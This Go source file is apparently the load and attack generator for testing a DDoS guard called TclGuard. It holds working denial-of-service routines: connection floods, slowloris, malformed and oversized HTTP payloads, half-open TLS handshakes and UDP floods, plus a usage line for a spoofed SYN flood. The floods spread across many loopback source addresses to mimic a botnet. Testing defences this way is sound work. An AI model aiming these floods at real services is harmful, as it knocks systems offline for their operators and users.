// tgload: load and attack generators for TclGuard's sustained flood test (stdlib only).
//
// Every "visitor" binds its own source address out of a loopback range (127.x.y.z are all local on Linux),
// so the guard's per-address defences see many distinct clients, like a real botnet would look.
//
//	tgload backend  -listen 127.0.0.1:9000
//	tgload http     -url http://127.0.0.1:8080/ -conns 32 -dur 30s -srcbase 127.0.1.0 [-tls]
//	tgload reqflood -url ... -conns 200 -dur 30s -srcbase 127.0.2.0 -srcn 200
//	tgload connflood -addr 127.0.0.1:8080 -workers 200 -dur 30s -srcbase 127.0.3.0 -srcn 500 [-hold 0s]
//	tgload slowloris -addr ... -conns 3000 -dur 30s -srcbase 127.0.4.0 -srcn 300
//	tgload garbage   -addr ... -workers 100 -dur 30s -srcbase 127.0.5.0 -srcn 100
//	tgload tlsflood  -addr ... -workers 100 -dur 30s -srcbase 127.0.6.0 -srcn 100 [-halfopen]
//	tgload udpflood  -addr ... -pps 50000 -dur 30s -srcbase 127.0.7.0 -srcn 20 -size 64
//	tgload synflood  -addr ... -pps 50000 -dur 30s -srcbase 10.77.128.0 -srcn 20000   (Linux, root, SPOOFED sources)
//
// Each client command prints one JSON object with the totals when it finishes.
package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

func srcAddr(base string, n int, i int) *net.TCPAddr {
	ip := net.ParseIP(base).To4()
	if ip == nil {
		return nil
	}
	k := i % n
	v := (int(ip[1]) << 16) | (int(ip[2]) << 8) | int(ip[3])
	v += k + 1
	return &net.TCPAddr{IP: net.IPv4(ip[0], byte(v>>16), byte(v>>8), byte(v))}
}

func dialer(base string, n int, i int, timeout time.Duration) *net.Dialer {
	d := &net.Dialer{Timeout: timeout}
	if a := srcAddr(base, n, i); a != nil && n > 0 {
		d.LocalAddr = a
	}
	return d
}

type counters struct {
	m  sync.Mutex
	kv map[string]int64
}

func (c *counters) add(k string, n int64) {
	c.m.Lock()
	if c.kv == nil {
		c.kv = map[string]int64{}
	}
	c.kv[k] += n
	c.m.Unlock()
}

func emit(cmd string, dur time.Duration, c *counters, extra map[string]any) {
	out := map[string]any{"cmd": cmd, "seconds": dur.Seconds(), "counts": c.kv}
	for k, v := range extra {
		out[k] = v
	}
	b, _ := json.Marshal(out)
	fmt.Println(string(b))
}

func pct(l []float64, p float64) float64 {
	if len(l) == 0 {
		return 0
	}
	sort.Float64s(l)
	i := int(float64(len(l)-1) * p)
	return l[i]
}

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintln(os.Stderr, "usage: tgload <backend|http|reqflood|connflood|slowloris|garbage|tlsflood|udpflood|synflood> [flags]")
		os.Exit(2)
	}
	cmd := os.Args[1]
	fs := flag.NewFlagSet(cmd, flag.ExitOnError)
	listen := fs.String("listen", "127.0.0.1:9000", "backend listen address")
	url := fs.String("url", "http://127.0.0.1:8080/", "target URL")
	addr := fs.String("addr", "127.0.0.1:8080", "target host:port")
	conns := fs.Int("conns", 32, "concurrent connections")
	workers := fs.Int("workers", 100, "concurrent workers")
	dur := fs.Duration("dur", 30*time.Second, "duration")
	srcbase := fs.String("srcbase", "", "base loopback address for source IPs, e.g. 127.0.1.0")
	srcn := fs.Int("srcn", 1, "number of distinct source addresses")
	useTLS := fs.Bool("tls", false, "https")
	halfopen := fs.Bool("halfopen", false, "tlsflood: abandon after the ClientHello")
	hold := fs.Duration("hold", 0, "connflood: keep each connection open this long")
	pps := fs.Int("pps", 50000, "udpflood: packets per second")
	size := fs.Int("size", 64, "udpflood: payload bytes")
	think := fs.Duration("think", time.Millisecond, "http: pause between a visitor's requests")
	_ = fs.Parse(os.Args[2:])

	switch cmd {
	case "backend":
		runBackend(*listen)
	case "http", "reqflood":
		runHTTP(cmd, *url, *conns, *dur, *srcbase, *srcn, *useTLS, *think)
	case "connflood":
		runConnFlood(*addr, *workers, *dur, *srcbase, *srcn, *hold)
	case "slowloris":
		runSlowloris(*addr, *conns, *dur, *srcbase, *srcn)
	case "garbage":
		runGarbage(*addr, *workers, *dur, *srcbase, *srcn)
	case "tlsflood":
		runTLSFlood(*addr, *workers, *dur, *srcbase, *srcn, *halfopen)
	case "udpflood":
		runUDPFlood(*addr, *pps, *dur, *srcbase, *srcn, *size)
	case "synflood":
		runSynFlood(*addr, *pps, *dur, *srcbase, *srcn)
	default:
		fmt.Fprintln(os.Stderr, "unknown command", cmd)
		os.Exit(2)
	}
}

// ------------------------------------------------------------------ backend ---

func runBackend(listen string) {
	body := []byte(strings.Repeat("x", 512))
	srv := &http.Server{Addr: listen, Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Length", fmt.Sprint(len(body)))
		w.Write(body)
	})}
	fmt.Fprintln(os.Stderr, "backend listening on", listen)
	if err := srv.ListenAndServe(); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}

// --------------------------------------------------------------------- http ---

func runHTTP(cmd, url string, conns int, dur time.Duration, srcbase string, srcn int, useTLS bool, think time.Duration) {
	var c counters
	var latMu sync.Mutex
	var lats []float64
	deadline := time.Now().Add(dur)
	var wg sync.WaitGroup
	// per-second series for the report
	var sec int64
	series := make([]int64, int(dur.Seconds())+2)
	start := time.Now()
	for i := 0; i < conns; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			for time.Now().Before(deadline) {
				tr := &http.Transport{
					DialContext:         dialer(srcbase, srcn, i, 5*time.Second).DialContext,
					DisableKeepAlives:   false,
					MaxIdleConnsPerHost: 1,
					TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
				}
				cl := &http.Client{Transport: tr, Timeout: 10 * time.Second}
				for time.Now().Before(deadline) {
					t0 := time.Now()
					resp, err := cl.Get(url)
					if err != nil {
						c.add("error", 1)
						break // new transport (new connection) after a failure
					}
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
					d := time.Since(t0).Seconds() * 1000
					c.add(fmt.Sprintf("status_%d", resp.StatusCode), 1)
					if resp.StatusCode == 200 {
						latMu.Lock()
						lats = append(lats, d)
						latMu.Unlock()
						if idx := int(time.Since(start).Seconds()); idx < len(series) {
							atomic.AddInt64(&series[idx], 1)
						}
					}
					if cmd == "http" {
						time.Sleep(think) // a visitor, not a flood
					}
				}
				tr.CloseIdleConnections()
				time.Sleep(50 * time.Millisecond)
			}
		}(i)
	}
	wg.Wait()
	_ = sec
	ok := c.kv["status_200"]
	extra := map[string]any{
		"ok_rps": float64(ok) / dur.Seconds(),
		"p50_ms": pct(lats, 0.50), "p90_ms": pct(lats, 0.90), "p99_ms": pct(lats, 0.99), "max_ms": pct(lats, 1.0),
		"ok_per_second": series[:int(dur.Seconds())],
	}
	emit(cmd, dur, &c, extra)
}

// ---------------------------------------------------------------- connflood ---

func runConnFlood(addr string, workers int, dur time.Duration, srcbase string, srcn int, hold time.Duration) {
	var c counters
	deadline := time.Now().Add(dur)
	var wg sync.WaitGroup
	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func(w int) {
			defer wg.Done()
			i := w
			for time.Now().Before(deadline) {
				i += workers
				conn, err := dialer(srcbase, srcn, i, 3*time.Second).Dial("tcp", addr)
				if err != nil {
					c.add("dial_error", 1)
					continue
				}
				c.add("connected", 1)
				if hold > 0 {
					conn.SetReadDeadline(time.Now().Add(hold))
					buf := make([]byte, 1)
					if _, err := conn.Read(buf); err != nil && !os.IsTimeout(err) {
						c.add("closed_by_server", 1)
					}
				} else {
					conn.SetReadDeadline(time.Now().Add(20 * time.Millisecond))
					buf := make([]byte, 1)
					if _, err := conn.Read(buf); err != nil && !os.IsTimeout(err) {
						c.add("closed_by_server", 1)
					}
				}
				conn.Close()
			}
		}(w)
	}
	wg.Wait()
	emit("connflood", dur, &c, nil)
}

// ---------------------------------------------------------------- slowloris ---

func runSlowloris(addr string, conns int, dur time.Duration, srcbase string, srcn int) {
	var c counters
	deadline := time.Now().Add(dur)
	var wg sync.WaitGroup
	var openNow int64
	for i := 0; i < conns; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			for time.Now().Before(deadline) {
				conn, err := dialer(srcbase, srcn, i, 3*time.Second).Dial("tcp", addr)
				if err != nil {
					c.add("dial_error", 1)
					time.Sleep(200 * time.Millisecond)
					continue
				}
				atomic.AddInt64(&openNow, 1)
				c.add("opened", 1)
				t0 := time.Now()
				conn.Write([]byte("GET / HTTP/1.1\r\nHost: x\r\n"))
				closed := false
				for time.Now().Before(deadline) {
					time.Sleep(1500 * time.Millisecond)
					if _, err := conn.Write([]byte("X-a: b\r\n")); err != nil {
						closed = true
						break
					}
				}
				atomic.AddInt64(&openNow, -1)
				if closed {
					c.add("cut_off_by_server", 1)
					c.add("cut_off_ms_total", time.Since(t0).Milliseconds())
				} else {
					c.add("still_open_at_end", 1)
				}
				conn.Close()
				time.Sleep(100 * time.Millisecond)
			}
		}(i)
	}
	wg.Wait()
	emit("slowloris", dur, &c, nil)
}

// ------------------------------------------------------------------ garbage ---

func runGarbage(addr string, workers int, dur time.Duration, srcbase string, srcn int) {
	var c counters
	deadline := time.Now().Add(dur)
	var wg sync.WaitGroup
	payloads := [][]byte{
		[]byte("GET / HTTP/1.1\r\nHost: x\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n"),
		[]byte("\x16\x03\x01\x00\xa5\x01\x00\x00\xa1\x03\x03"),
		[]byte("POST / HTTP/1.1\r\nHost: x\r\nContent-Length: -1\r\n\r\n"),
		[]byte("\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n"),
		[]byte("GET /" + strings.Repeat("A", 20000) + " HTTP/1.1\r\nHost: x\r\n\r\n"),
	}
	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func(w int) {
			defer wg.Done()
			r := rand.New(rand.NewSource(int64(w)))
			i := w
			for time.Now().Before(deadline) {
				i += workers
				conn, err := dialer(srcbase, srcn, i, 3*time.Second).Dial("tcp", addr)
				if err != nil {
					c.add("dial_error", 1)
					continue
				}
				c.add("connected", 1)
				var p []byte
				if r.Intn(3) == 0 {
					p = make([]byte, 100+r.Intn(900))
					r.Read(p)
				} else {
					p = payloads[r.Intn(len(payloads))]
				}
				conn.Write(p)
				conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
				br := bufio.NewReader(conn)
				if line, err := br.ReadString('\n'); err == nil && strings.HasPrefix(line, "HTTP/1.") {
					c.add("answered", 1)
				}
				conn.Close()
			}
		}(w)
	}
	wg.Wait()
	emit("garbage", dur, &c, nil)
}

// ------------------------------------------------------------------ tlsflood ---

func runTLSFlood(addr string, workers int, dur time.Duration, srcbase string, srcn int, halfopen bool) {
	var c counters
	deadline := time.Now().Add(dur)
	var wg sync.WaitGroup
	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func(w int) {
			defer wg.Done()
			i := w
			for time.Now().Before(deadline) {
				i += workers
				raw, err := dialer(srcbase, srcn, i, 3*time.Second).Dial("tcp", addr)
				if err != nil {
					c.add("dial_error", 1)
					continue
				}
				if halfopen {
					raw.Write([]byte("\x16\x03\x01\x00\x05\x01\x00\x00\x01\x00")) // truncated ClientHello: handshake never completes
					raw.SetReadDeadline(time.Now().Add(150 * time.Millisecond))
					buf := make([]byte, 1)
					if _, err := raw.Read(buf); err != nil && !os.IsTimeout(err) {
						c.add("closed_by_server", 1)
					}
					raw.Close()
					c.add("halfopen_sent", 1)
					continue
				}
				t := tls.Client(raw, &tls.Config{InsecureSkipVerify: true})
				t.SetDeadline(time.Now().Add(5 * time.Second))
				if err := t.Handshake(); err != nil {
					c.add("handshake_failed", 1)
				} else {
					c.add("handshake_ok", 1)
				}
				t.Close()
			}
		}(w)
	}
	wg.Wait()
	emit("tlsflood", dur, &c, nil)
}

// ------------------------------------------------------------------ udpflood ---

func runUDPFlood(addr string, pps int, dur time.Duration, srcbase string, srcn int, size int) {
	var c counters
	ra, err := net.ResolveUDPAddr("udp", addr)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	var socks []*net.UDPConn
	for i := 0; i < srcn; i++ {
		var la *net.UDPAddr
		if a := srcAddr(srcbase, srcn, i); a != nil {
			la = &net.UDPAddr{IP: a.IP}
		}
		s, err := net.DialUDP("udp", la, ra)
		if err != nil {
			continue
		}
		socks = append(socks, s)
	}
	if len(socks) == 0 {
		fmt.Fprintln(os.Stderr, "no sockets")
		os.Exit(1)
	}
	payload := make([]byte, size)
	rand.Read(payload)
	var replies int64
	for _, s := range socks {
		go func(s *net.UDPConn) {
			buf := make([]byte, 2048)
			for {
				s.SetReadDeadline(time.Now().Add(dur + 2*time.Second))
				if _, err := s.Read(buf); err != nil {
					return
				}
				atomic.AddInt64(&replies, 1)
			}
		}(s)
	}
	deadline := time.Now().Add(dur)
	tick := time.NewTicker(10 * time.Millisecond)
	defer tick.Stop()
	perTick := pps / 100
	if perTick < 1 {
		perTick = 1
	}
	n := 0
	for now := range tick.C {
		if now.After(deadline) {
			break
		}
		for i := 0; i < perTick; i++ {
			s := socks[n%len(socks)]
			n++
			if _, err := s.Write(payload); err == nil {
				c.add("sent", 1)
			} else {
				c.add("send_error", 1)
			}
		}
	}
	time.Sleep(300 * time.Millisecond)
	c.add("replies_seen", atomic.LoadInt64(&replies))
	emit("udpflood", dur, &c, map[string]any{"target_pps": pps, "sources": len(socks)})
	_ = context.Background
}
